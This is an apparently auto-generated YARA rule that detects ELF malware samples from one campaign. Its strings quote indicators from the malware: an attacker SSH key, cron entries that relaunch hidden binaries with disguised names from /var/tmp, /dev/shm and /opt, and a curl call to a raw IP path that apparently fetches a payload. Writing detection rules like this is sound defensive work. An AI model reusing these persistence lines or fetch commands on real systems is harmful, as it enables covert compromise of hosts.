rule Sightlines_host_a5de3c02_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-a5de3c02"
        date = "2026-11-24"
        campaign = "host-a5de3c02"
        family = ""
        hash = "4d2ce15912453106a7b526f83cf7fc3f0515fe811b476e6f896ba8b8d9920377"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-a5de3c02.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "BXkMvZ6mX7LzCUM2PVHnVfVeCLdwiOINikzW9qzlr8WoHw4qEGJLuQBWXjJu+m2+FdaOD6PL53nY3w== ElPatrono1337" ascii
        $s1 = "kw6IwmhTZ+AcD3eDpgsTloqmVgcXDUmvjWR/fNiImmgU9wlw/lalf/WrIuCDp0PArQtjNg/vo7HUGq9SrEIE2jvyVW59mvoYOwfn" ascii
        $s2 = "DLUiguKZirZgpjZF2DDKK6WpZVTVpKcH+HEFdmFAqJInem/CRUE0bqjMr88bUyDjVw9FtJ5EmQenctjrFVaB7hswOaJBmFQmn9G/" ascii
        $s3 = "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoBjnno5GBoIuIYIhrJsQxF6OPHtAbOUIEFB+gdfb1tUTjs+f9zCMGkmNmH45fYVu" ascii
        $s4 = "@monthly /var/tmp/876c7af6/./01b51ec6 > /dev/null 2>&1 & disown" ascii
        $s5 = "@daily /var/tmp/876c7af6/./01b51ec6 > /dev/null 2>&1 & disown" ascii
        $s6 = "@reboot /var/tmp/876c7af6/./01b51ec6 > /dev/null 2>&1 & disown" ascii
        $s7 = "if curl -s --connect-timeout 15 195.24.237.240/.x/black3; then" ascii
        $s8 = "    LOCK_DATA=$(cat \"$LOCKFILE\" 2>/dev/null)" ascii
        $s9 = "@reboot root /dev/shm/.Xgnupg-metadata/.fontconfig/.sysconfig >/dev/null 2>&1 &" ascii
        $s10 = "@reboot root /opt/.systemd-private/.pki/.sysconfig >/dev/null 2>&1 &" ascii
        $s11 = "CHILD_LOCKFILE=\"/var/log/.apt-cache.log\"" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 27328512 and 12 of them
}
